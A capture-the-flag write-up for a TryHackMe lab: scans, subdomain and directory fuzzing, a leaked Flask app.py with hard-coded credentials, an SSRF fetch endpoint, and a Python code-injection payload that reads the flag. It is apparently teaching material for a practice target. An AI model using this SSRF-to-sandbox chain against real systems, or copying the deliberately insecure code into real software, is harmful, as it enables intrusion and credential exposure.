# **Chains of Love - TryHackMe**

*Target Ip. Address: 10.49.132.89*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.49.132.89
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-18 11:10 +0545
Nmap scan report for 10.49.132.89
Host is up (0.047s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 de:52:17:0e:ae:a1:d5:40:02:cf:e1:c0:10:e0:ec:12 (ECDSA)
|_  256 f1:43:20:75:bd:3f:7d:e1:3c:4d:c1:22:e8:15:6f:ec (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nova.thm/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.28 seconds
```

So, we have 2 open ports. Port 22 (ssh) and port 80 (http). Before heading to website, add nova.thm in the hosts file.

```bash
kali@kali:cat /etc/hosts
10.49.132.89    nova.thm

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

Nothing interesting, let's see if it has subdomains available.

```bash
kali@kali:ffuf -u "http://nova.thm" -H "Host: FUZZ.nova.thm" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs 2873,178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nova.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.nova.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2873,178
________________________________________________

internal                [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 41ms]
:: Progress: [5000/5000] :: Job [1/1] :: 947 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

So, let's add internal to our hosts file, although it is showing 403 status code.

```bash\
kali@kali:cat /etc/hosts
10.49.132.89    nova.thm internal.nova.thm

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

I tried some basic 403 bypass methods, but none worked.

Let's run gobuster on our main host nova.thm, to see anything interesting.

```bash
kali@kali:gobuster dir -u http://nova.thm -w /usr/share/wordlists/dirb/common.txt -x .py
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nova.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.git/HEAD            (Status: 200) [Size: 23]
about                (Status: 200) [Size: 2632]
admin                (Status: 302) [Size: 211] [--> /admin/login]
app.py               (Status: 200) [Size: 3364]
contact              (Status: 200) [Size: 2146]
services             (Status: 200) [Size: 2840]
Progress: 9226 / 9226 (100.00%)
===============================================================
Finished
===============================================================
```


So, we have .git, admin redirecting to login and app.py.

We will see .git later if need be, let's read app.py before.

```app.py
from flask import Flask, request, render_template, render_template_string, redirect
import os
import jwt
import datetime
import requests
from markupsafe import escape

app = Flask(__name__, static_folder=".", static_url_path="")

JWT_SECRET = os.environ.get("ADMIN_SECRET", "dev_secret_for_ctf")

app.config["DEBUG"] = False
app.config["ENV"] = "production"
app.config["VERSION"] = "2.3.1"
app.config["DATABASE_URL"] = "postgresql://app_user:********@db.internal:5432/novadev"
app.config["REDIS_HOST"] = "redis.internal"
app.config["ADMIN_SECRET"] = JWT_SECRET

ADMIN_USERNAME = "no...1a"
ADMIN_PASSWORD = "X7...zA"

@app.route("/")
def home():
    return render_template("home.html")


@app.route("/about")
def about():
    return render_template("about.html")


@app.route("/services")
def services():
    return render_template("services.html")


@app.route("/contact", methods=["GET", "POST"])
def contact():

    if request.method == "POST":

        message = request.form.get("message", "").strip()

        # Security by Obscurity

        if message == "{{ config }}":

            return render_template_string(
            message,
            config=app.config
            )

        #This escapes all text
        safe_message = escape(message)

        template = f"""
        <h3>Thank you for your message</h3>
        <div class="preview-box">
            {safe_message}
        </div>
        """

        return template
    return render_template("contact.html")

def verify_jwt(token):
    try:
        return jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
    except Exception:
        return None

@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            payload = {
                "user": username,
                "role": "admin",
                "iat": datetime.datetime.utcnow(),
                "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)
            }

            token = jwt.encode(payload, JWT_SECRET, algorithm="HS256")

            resp = redirect("/admin")
            resp.set_cookie("token", token)
            return resp

        return render_template("admin_login.html", error="Invalid credentials")

    return render_template("admin_login.html")

@app.route("/admin")
def admin():
    token = request.cookies.get("token")
    if not token:
        return redirect("/admin/login")

    data = verify_jwt(token)
    if not data or data.get("role") != "admin":
        return "Unauthorized"

    return render_template("admin.html")


@app.route("/admin/fetch")
def fetch():
    token = request.cookies.get("token")
    data = verify_jwt(token)

    if not data or data.get("role") != "admin":
        return "Unauthorized"

    url = request.args.get("url")
    if not url:
        return "No URL provided"

    if any(char.isdigit() for char in url):
        return "Digits are not allowed, we really like DNS!"

    try:
        response = requests.get(url, timeout=5)
        return response.text
    except Exception as e:
        return f"Request failed: {str(e)}"


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
```

We find hard-coded admin credentials, let's use these credentials to login.

<img width="1201" height="795" alt="image" src="https://github.com/user-attachments/assets/a5bd796e-b425-453d-b200-ffc81790e2b3" />

So, we have a Internal QA URL Fetch Tool, the placeholder likely suggests the internal.nova.thm subdomain with 403 status code we saw.

<img width="1208" height="659" alt="image" src="https://github.com/user-attachments/assets/04d6c71b-5ce2-4cfb-8c46-1eb362df46e3" />

We get a Python Sandbox, and on the url title, we see "*http://nova.thm/admin/fetch?url=http%3A%2F%2Finternal.nova.thm*", our search URL being added.

We can leverage this to read the flag. Many syntaxes and commands are blocked. We can successfully read the flag with "*http://internal.nova.thm?code=list(open('flag.txt'))*"

<img width="1201" height="411" alt="image" src="https://github.com/user-attachments/assets/9bb40d5e-5996-4b34-af2d-f504ace5d4e7" />
